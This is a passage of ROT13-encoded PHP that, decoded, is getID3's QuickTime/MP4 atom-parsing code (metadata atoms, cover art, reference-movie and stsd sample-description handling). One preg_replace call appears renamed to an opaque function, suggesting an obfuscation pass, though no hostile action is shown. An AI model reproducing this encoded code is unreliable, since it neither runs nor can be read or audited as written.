						} ryfr {
							juvyr ($ngbzbssfrg < fgeyra($ngbz_qngn)) {
								$obkfvmr = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $ngbzbssfrg, 4));
								$obkglcr =                           fhofge($ngbz_qngn, $ngbzbssfrg + 4, 4);
								$obkqngn =                           fhofge($ngbz_qngn, $ngbzbssfrg + 8, $obkfvmr - 8);
								vs ($obkfvmr <= 1) {
									$guvf->jneavat('Vainyvq DhvpxGvzr ngbz obk fvmr \"'.$obkfvmr.'\" va ngbz \"'.__sa_79955('#[^n-mN-M0-9 _\\-]#', '?', $ngbzanzr).'\" ng bssfrg: '.($ngbz_fgehpgher['bssfrg'] + $ngbzbssfrg));
									$ngbz_fgehpgher['qngn'] = ahyy;
									$ngbzbssfrg = fgeyra($ngbz_qngn);
									oernx;
								}
								$ngbzbssfrg += $obkfvmr;

								fjvgpu ($obkglcr) {
									pnfr 'zrna':
									pnfr 'anzr':
										$ngbz_fgehpgher[$obkglcr] = fhofge($obkqngn, 4);
										oernx;

									pnfr 'qngn':
										$ngbz_fgehpgher['irefvba']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn,  0, 1));
										$ngbz_fgehpgher['syntf_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn,  1, 3));
										fjvgpu ($ngbz_fgehpgher['syntf_enj']) {
											pnfr  0: // qngn synt
											pnfr 21: // gzcb/pcvy synt
												fjvgpu ($ngbzanzr) {
													pnfr 'pcvy':
													pnfr 'uqiq':
													pnfr 'cpfg':
													pnfr 'ctnc':
														// 8-ovg vagrtre (obbyrna)
														$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 1));
														oernx;

													pnfr 'gzcb':
														// 16-ovg vagrtre
														$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 2));
														oernx;

													pnfr 'qvfx':
													pnfr 'gexa':
														// ovanel
														$ahz       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 10, 2));
														$ahz_gbgny = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 12, 2));
														$ngbz_fgehpgher['qngn']  = rzcgl($ahz) ? '' : $ahz;
														$ngbz_fgehpgher['qngn'] .= rzcgl($ahz_gbgny) ? '' : '/'.$ahz_gbgny;
														oernx;

													pnfr 'taer':
														// rahz
														$TraerVQ = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 4));
														$ngbz_fgehpgher['qngn']    = trgvq3_vq3i1::YbbxhcTraerAnzr($TraerVQ - 1);
														oernx;

													pnfr 'egat':
														// 8-ovg vagrtre
														$ngbz_fgehpgher[$ngbzanzr] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 1));
														$ngbz_fgehpgher['qngn']    = $guvf->DhvpxgvzrPbagragEngvatYbbxhc($ngbz_fgehpgher[$ngbzanzr]);
														oernx;

													pnfr 'fgvx':
														// 8-ovg vagrtre (rahz)
														$ngbz_fgehpgher[$ngbzanzr] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 1));
														$ngbz_fgehpgher['qngn']    = $guvf->DhvpxgvzrFGVXYbbxhc($ngbz_fgehpgher[$ngbzanzr]);
														oernx;

													pnfr 'fsVQ':
														// 32-ovg vagrtre
														$ngbz_fgehpgher[$ngbzanzr] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 4));
														$ngbz_fgehpgher['qngn']    = $guvf->DhvpxgvzrFgberSebagPbqrYbbxhc($ngbz_fgehpgher[$ngbzanzr]);
														oernx;

													pnfr 'rtvq':
													pnfr 'chey':
														$ngbz_fgehpgher['qngn'] = fhofge($obkqngn, 8);
														oernx;

													pnfr 'cyVQ':
														// 64-ovg vagrtre
														$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 8));
														oernx;

													pnfr 'pbie':
														$ngbz_fgehpgher['qngn'] = fhofge($obkqngn, 8);
														// abg n sbbycebbs purpx, ohg orggre guna abguvat
														vs (cert_zngpu('#^\\kSS\\kQ8\\kSS#', $ngbz_fgehpgher['qngn'])) {
															$ngbz_fgehpgher['vzntr_zvzr'] = 'vzntr/wcrt';
														} ryfrvs (cert_zngpu('#^\\k89\\k50\\k4R\\k47\\k0Q\\k0N\\k1N\\k0N#', $ngbz_fgehpgher['qngn'])) {
															$ngbz_fgehpgher['vzntr_zvzr'] = 'vzntr/cat';
														} ryfrvs (cert_zngpu('#^TVS#', $ngbz_fgehpgher['qngn'])) {
															$ngbz_fgehpgher['vzntr_zvzr'] = 'vzntr/tvs';
														}
														$vasb['dhvpxgvzr']['pbzzragf']['cvpgher'][] = neenl('vzntr_zvzr'=>$ngbz_fgehpgher['vzntr_zvzr'], 'qngn'=>$ngbz_fgehpgher['qngn'], 'qrfpevcgvba'=>'pbire');
														oernx;

													pnfr 'ngVQ':
													pnfr 'paVQ':
													pnfr 'trVQ':
													pnfr 'girf':
													pnfr 'gifa':
													qrsnhyg:
														// 32-ovg vagrtre
														$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($obkqngn, 8, 4));
												}
												oernx;

											pnfr  1: // grkg synt
											pnfr 13: // vzntr synt
											qrsnhyg:
												$ngbz_fgehpgher['qngn'] = fhofge($obkqngn, 8);
												vs ($ngbzanzr == 'pbie') {
													vs (!rzcgl($ngbz_fgehpgher['qngn'])) {
														$ngbz_fgehpgher['vzntr_zvzr'] = 'vzntr/haxabja'; // cebivqr qrsnhyg ZVZR glcr gb rafher neenl xrlf rkvfg
														vs (shapgvba_rkvfgf('trgvzntrfvmrsebzfgevat') && ($trgvzntrfvmr = trgvzntrfvmrsebzfgevat($ngbz_fgehpgher['qngn'])) && !rzcgl($trgvzntrfvmr['zvzr'])) {
															$ngbz_fgehpgher['vzntr_zvzr'] = $trgvzntrfvmr['zvzr'];
														} ryfr {
															// vs trgvzntrfvmrsebzfgevat vf abg ninvynoyr, be snvyf sbe fbzr ernfba, snyy onpx gb fvzcyr qrgrpgvba bs pbzzba vzntr sbezngf
															$VzntrSbezngFvtangherf = neenl(
																'vzntr/wcrt' => \"\kSS\kQ8\kSS\",
																'vzntr/cat'  => \"\k89\k50\k4R\k47\k0Q\k0N\k1N\k0N\",
																'vzntr/tvs'  => 'TVS',
															);
															sbernpu ($VzntrSbezngFvtangherf nf $zvzr => $vzntr_sbezng_fvtangher) {
																vs (fhofge($ngbz_fgehpgher['qngn'], 0, fgeyra($vzntr_sbezng_fvtangher)) == $vzntr_sbezng_fvtangher) {
																	$ngbz_fgehpgher['vzntr_zvzr'] = $zvzr;
																	oernx;
																}
															}
														}
														$vasb['dhvpxgvzr']['pbzzragf']['cvpgher'][] = neenl('vzntr_zvzr'=>$ngbz_fgehpgher['vzntr_zvzr'], 'qngn'=>$ngbz_fgehpgher['qngn'], 'qrfpevcgvba'=>'pbire');
													} ryfr {
														$guvf->jneavat('Haxabja rzcgl \"pbie\" vzntr ng bssfrg '.$onfrbssfrg);
													}
												}
												oernx;

										}
										oernx;

									qrsnhyg:
										$guvf->jneavat('Haxabja DhvpxGvzr obk glcr: \"'.__sa_79955('#[^n-mN-M0-9 _\\-]#', '?', $obkglcr).'\" ('.gevz(trgvq3_yvo::CevagUrkOlgrf($obkglcr)).') ng bssfrg '.$onfrbssfrg);
										$ngbz_fgehpgher['qngn'] = $ngbz_qngn;

								}
							}
						}
					}
					$guvf->PbclGbNccebcevngrPbzzragfFrpgvba($ngbzanzr, $ngbz_fgehpgher['qngn'], $ngbz_fgehpgher['anzr']);
					oernx;


				pnfr 'cynl': // nhgb-CYNL ngbz
					$ngbz_fgehpgher['nhgbcynl'] = (obby) trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));

					$vasb['dhvpxgvzr']['nhgbcynl'] = $ngbz_fgehpgher['nhgbcynl'];
					oernx;


				pnfr 'JYBP': // Jvaqbj YBPngvba ngbz
					$ngbz_fgehpgher['ybpngvba_k']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 2));
					$ngbz_fgehpgher['ybpngvba_l']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  2, 2));
					oernx;


				pnfr 'YBBC': // YBBCvat ngbz
				pnfr 'FryB': // cynl FRYrpgvba Bayl ngbz
				pnfr 'NyyS': // cynl NYY Senzrf ngbz
					$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag($ngbz_qngn);
					oernx;


				pnfr 'anzr': //
				pnfr 'ZPCF': // Zrqvn Pyrnare CEb
				pnfr '@CEZ': // nqbor CErZvrer irefvba
				pnfr '@CED': // nqbor CErzvrer Dhvpxgvzr irefvba
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;


				pnfr 'pziq': // Pbzcerffrq ZbbI Qngn ngbz
					// Pbqr ol horetrrxØhoretrrx*gi onfrq ba vasbezngvba sebz
					// uggc://qrirybcre.nccyr.pbz/dhvpxgvzr/vprsybr/qvfcngpu012.ugzy
					$ngbz_fgehpgher['haPbzcerffrqFvmr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 4));

					$PbzcerffrqSvyrQngn = fhofge($ngbz_qngn, 4);
					vs ($HapbzcerffrqUrnqre = @tmhapbzcerff($PbzcerffrqSvyrQngn)) {
						$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($HapbzcerffrqUrnqre, 0, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					} ryfr {
						$guvf->jneavat('Reebe qrpbzcerffvat pbzcerffrq ZBI ngbz ng bssfrg '.$ngbz_fgehpgher['bssfrg']);
					}
					oernx;


				pnfr 'qpbz': // Qngn PBZcerffvba ngbz
					$ngbz_fgehpgher['pbzcerffvba_vq']   = $ngbz_qngn;
					$ngbz_fgehpgher['pbzcerffvba_grkg'] = $guvf->DhvpxgvzrQPBZYbbxhc($ngbz_qngn);
					oernx;


				pnfr 'eqes': // Ersrerapr zbivr Qngn ErSrerapr ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3));
					$ngbz_fgehpgher['syntf']['vagreany_qngn'] = (obby) ($ngbz_fgehpgher['syntf_enj'] & 0k000001);

					$ngbz_fgehpgher['ersrerapr_glcr_anzr']    =                           fhofge($ngbz_qngn,  4, 4);
					$ngbz_fgehpgher['ersrerapr_yratgu']       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					fjvgpu ($ngbz_fgehpgher['ersrerapr_glcr_anzr']) {
						pnfr 'hey ':
							$ngbz_fgehpgher['hey']            =       $guvf->AbAhyyFgevat(fhofge($ngbz_qngn, 12));
							oernx;

						pnfr 'nyvf':
							$ngbz_fgehpgher['svyr_nyvnf']     =                           fhofge($ngbz_qngn, 12);
							oernx;

						pnfr 'efep':
							$ngbz_fgehpgher['erfbhepr_nyvnf'] =                           fhofge($ngbz_qngn, 12);
							oernx;

						qrsnhyg:
							$ngbz_fgehpgher['qngn']           =                           fhofge($ngbz_qngn, 12);
							oernx;
					}
					oernx;


				pnfr 'ezdh': // Ersrerapr Zbivr DHnyvgl ngbz
					$ngbz_fgehpgher['zbivr_dhnyvgl'] = trgvq3_yvo::OvtRaqvna2Vag($ngbz_qngn);
					oernx;


				pnfr 'ezpf': // Ersrerapr Zbivr Pch Fcrrq ngbz
					$ngbz_fgehpgher['irefvba']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['pch_fcrrq_engvat'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2));
					oernx;


				pnfr 'ezip': // Ersrerapr Zbivr Irefvba Purpx ngbz
					$ngbz_fgehpgher['irefvba']            = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['trfgnyg_fryrpgbe']   =                           fhofge($ngbz_qngn,  4, 4);
					$ngbz_fgehpgher['trfgnyg_inyhr_znfx'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  8, 4));
					$ngbz_fgehpgher['trfgnyg_inyhr']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 12, 4));
					$ngbz_fgehpgher['trfgnyg_purpx_glcr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 14, 2));
					oernx;


				pnfr 'ezpq': // Ersrerapr Zbivr Pbzcbarag purpx ngbz
					$ngbz_fgehpgher['irefvba']                = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']              = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['pbzcbarag_glcr']         =                           fhofge($ngbz_qngn,  4, 4);
					$ngbz_fgehpgher['pbzcbarag_fhoglcr']      =                           fhofge($ngbz_qngn,  8, 4);
					$ngbz_fgehpgher['pbzcbarag_znahsnpghere'] =                           fhofge($ngbz_qngn, 12, 4);
					$ngbz_fgehpgher['pbzcbarag_syntf_enj']    = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 16, 4));
					$ngbz_fgehpgher['pbzcbarag_syntf_znfx']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 20, 4));
					$ngbz_fgehpgher['pbzcbarag_zva_irefvba']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 24, 4));
					oernx;


				pnfr 'ezqe': // Ersrerapr Zbivr Qngn Engr ngbz
					$ngbz_fgehpgher['irefvba']       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['qngn_engr']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));

					$ngbz_fgehpgher['qngn_engr_ocf'] = $ngbz_fgehpgher['qngn_engr'] * 10;
					oernx;


				pnfr 'ezyn': // Ersrerapr Zbivr Ynathntr Ngbz
					$ngbz_fgehpgher['irefvba']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['ynathntr_vq'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 2));

					$ngbz_fgehpgher['ynathntr']    = $guvf->DhvpxgvzrYnathntrYbbxhc($ngbz_fgehpgher['ynathntr_vq']);
					vs (rzcgl($vasb['pbzzragf']['ynathntr']) || (!va_neenl($ngbz_fgehpgher['ynathntr'], $vasb['pbzzragf']['ynathntr']))) {
						$vasb['pbzzragf']['ynathntr'][] = $ngbz_fgehpgher['ynathntr'];
					}
					oernx;


				pnfr 'cgi ': // Cevag Gb Ivqrb - qrsvarf n zbivr'f shyy fperra zbqr
					// uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/NCVERS/FBHEPRFVI/ng_cgi-_ct.ugz
					$ngbz_fgehpgher['qvfcynl_fvmr_enj']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 2));
					$ngbz_fgehpgher['erfreirq_1']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 2, 2)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['erfreirq_2']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 4, 2)); // uneqpbqrq: 0k0000
					$ngbz_fgehpgher['fyvqr_fubj_synt']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 6, 1));
					$ngbz_fgehpgher['cynl_ba_bcra_synt'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 7, 1));

					$ngbz_fgehpgher['syntf']['cynl_ba_bcra'] = (obby) $ngbz_fgehpgher['cynl_ba_bcra_synt'];
					$ngbz_fgehpgher['syntf']['fyvqr_fubj']   = (obby) $ngbz_fgehpgher['fyvqr_fubj_synt'];

					$cgi_ybbxhc = neenl(
						0 => 'abezny',
						1 => 'qbhoyr',
						2 => 'unys',
						3 => 'shyy',
						4 => 'pheerag'
					);
					vs (vffrg($cgi_ybbxhc[$ngbz_fgehpgher['qvfcynl_fvmr_enj']])) {
						$ngbz_fgehpgher['qvfcynl_fvmr'] = $cgi_ybbxhc[$ngbz_fgehpgher['qvfcynl_fvmr_enj']];
					} ryfr {
						$guvf->jneavat('haxabja \"cgi \" qvfcynl pbafgnag ('.$ngbz_fgehpgher['qvfcynl_fvmr_enj'].')');
					}
					oernx;


				pnfr 'fgfq': // Fnzcyr Gnoyr Fnzcyr Qrfpevcgvba ngbz
					$ngbz_fgehpgher['irefvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1)); // uneqpbqrq: 0k00
					$ngbz_fgehpgher['syntf_enj']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3)); // uneqpbqrq: 0k000000
					$ngbz_fgehpgher['ahzore_ragevrf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));

					// frr: uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/111
					// Fbzr pbeehcg svyrf unir orra xabja gb unir uvtu ovgf frg va gur ahzore_ragevrf svryq
					// Guvf svryq fubhyqa'g ernyyl arrq gb or 32-ovgf, inyhrf fgberf ner yvxryl va gur enatr 1-100000
					// Jbexnebhaq: znfx bss gur hccre olgr naq guebj n jneavat vs vg'f abamreb
					vs ($ngbz_fgehpgher['ahzore_ragevrf'] > 0k000SSSSS) {
						vs ($ngbz_fgehpgher['ahzore_ragevrf'] > 0k00SSSSSS) {
							$guvf->jneavat('\"fgfq\" ngbz pbagnvaf vzcebonoyl ynetr ahzore_ragevrf (0k'.trgvq3_yvo::CevagUrkOlgrf(fhofge($ngbz_qngn, 4, 4), gehr, snyfr).' = '.$ngbz_fgehpgher['ahzore_ragevrf'].'), cebonoyl va reebe. Vtabevat hccre olgr naq vagrecergvat guvf nf 0k'.trgvq3_yvo::CevagUrkOlgrf(fhofge($ngbz_qngn, 5, 3), gehr, snyfr).' = '.($ngbz_fgehpgher['ahzore_ragevrf'] & 0k00SSSSSS));
							$ngbz_fgehpgher['ahzore_ragevrf'] = ($ngbz_fgehpgher['ahzore_ragevrf'] & 0k00SSSSSS);
						} ryfr {
							$guvf->jneavat('\"fgfq\" ngbz pbagnvaf vzcebonoyl ynetr ahzore_ragevrf (0k'.trgvq3_yvo::CevagUrkOlgrf(fhofge($ngbz_qngn, 4, 4), gehr, snyfr).' = '.$ngbz_fgehpgher['ahzore_ragevrf'].'), cebonoyl va reebe. Cyrnfr ercbeg guvf gb vasb@trgvq3.bet ersrerapvat oht ercbeg #111');
						}
					}

					$fgfqRagevrfQngnBssfrg = 8;
					sbe ($v = 0; $v < $ngbz_fgehpgher['ahzore_ragevrf']; $v++) {
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['fvmr']             = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfqRagevrfQngnBssfrg, 4));
						$fgfqRagevrfQngnBssfrg += 4;
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']      =                           fhofge($ngbz_qngn, $fgfqRagevrfQngnBssfrg, 4);
						$fgfqRagevrfQngnBssfrg += 4;
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['erfreirq']         = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfqRagevrfQngnBssfrg, 6));
						$fgfqRagevrfQngnBssfrg += 6;
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['ersrerapr_vaqrk']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $fgfqRagevrfQngnBssfrg, 2));
						$fgfqRagevrfQngnBssfrg += 2;
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn']             =                           fhofge($ngbz_qngn, $fgfqRagevrfQngnBssfrg, ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['fvmr'] - 4 - 4 - 6 - 2));
						$fgfqRagevrfQngnBssfrg += ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['fvmr'] - 4 - 4 - 6 - 2);
						vs (fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  1, 54) == 'nccyvpngvba/bpgrg-fgernz;glcr=pbz.cneebg.ivqrbzrgnqngn') {
							// fcrpvny unaqyvat sbe nccneragyl-znysbezrq (GrkgZrgnQngnFnzcyrRagel?) qngn sbe fbzr irefvba bs Cneebg qebarf
							$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['cneebg_senzr_zrgnqngn']['zvzr_glcr']        =       fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  1, 55);
							$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['cneebg_senzr_zrgnqngn']['zrgnqngn_irefvba'] = (vag) fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 55,  1);
							hafrg($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn']);
$guvf->jneavat('vapbzcyrgr/vapbeerpg unaqyvat bs \"fgfq\" jvgu Cneebg zrgnqngn va guvf irefvba bs trgVQ3() ['.$guvf->trgvq3->irefvba().']');
							pbagvahr;
						}

						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['rapbqre_irefvba']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  0, 2));
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['rapbqre_erivfvba'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  2, 2));
						$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['rapbqre_iraqbe']   =                           fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  4, 4);

						fjvgpu ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['rapbqre_iraqbe']) {

							pnfr \"\k00\k00\k00\k00\":
								// nhqvb genpxf
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_punaaryf']       =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  8,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_ovg_qrcgu']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 10,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_pbzcerffvba_vq'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 12,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_cnpxrg_fvmr']    =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 14,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['nhqvb_fnzcyr_engr']    = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 16,  4));

								// ivqrb genpxf
								// uggc://qrirybcre.nccyr.pbz/yvoenel/znp/#qbphzragngvba/DhvpxGvzr/DGSS/DGSSPunc3/dgss3.ugzy
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['grzcbeny_dhnyvgl'] =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'],  8,  4));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['fcngvny_dhnyvgl']  =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 12,  4));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['jvqgu']            =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 16,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['urvtug']           =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 18,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['erfbyhgvba_k']     = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 24,  4));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['erfbyhgvba_l']     = trgvq3_yvo::SvkrqCbvag16_16(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 28,  4));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_fvmr']        =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 32,  4));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['senzr_pbhag']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 36,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['pbzcerffbe_anzr']  =                             fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 38,  4);
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['cvkry_qrcgu']      =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 42,  2));
								$ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['pbybe_gnoyr_vq']   =   trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn'], 44,  2));

								fjvgpu ($ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng']) {
									pnfr '2ihL':
									pnfr 'nip1':
									pnfr 'pivq':
									pnfr 'qip ':
									pnfr 'qipc':
									pnfr 'tvs ':
									pnfr 'u263':
									pnfr 'uip1':
									pnfr 'wcrt':
									pnfr 'xcpq':
									pnfr 'zwcn':
									pnfr 'zwco':
									pnfr 'zc4i':
									pnfr 'cat ':
									pnfr 'enj ':
									pnfr 'eyr ':
									pnfr 'ecmn':
									pnfr 'fzp ':
									pnfr 'FID1':
									pnfr 'FID3':
									pnfr 'gvss':
									pnfr 'i210':
									pnfr 'i216':
									pnfr 'i308':
									pnfr 'i408':
									pnfr 'i410':
									pnfr 'lhi2':
										$vasb['svyrsbezng'] = 'zc4';
										$vasb['ivqrb']['sbhepp'] = $ngbz_fgehpgher['fnzcyr_qrfpevcgvba_gnoyr'][$v]['qngn_sbezng'];
										vs ($guvf->DhvpxgvzrIvqrbPbqrpYbbxhc($vasb['ivqrb']['sbhepp'])) {
											$vasb['ivqrb']['sbhepp_ybbxhc'] = $guvf->DhvpxgvzrIvqrbPbqrpYbbxhc($vasb['ivqrb']['sbhepp']);
										}

										// uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=1550
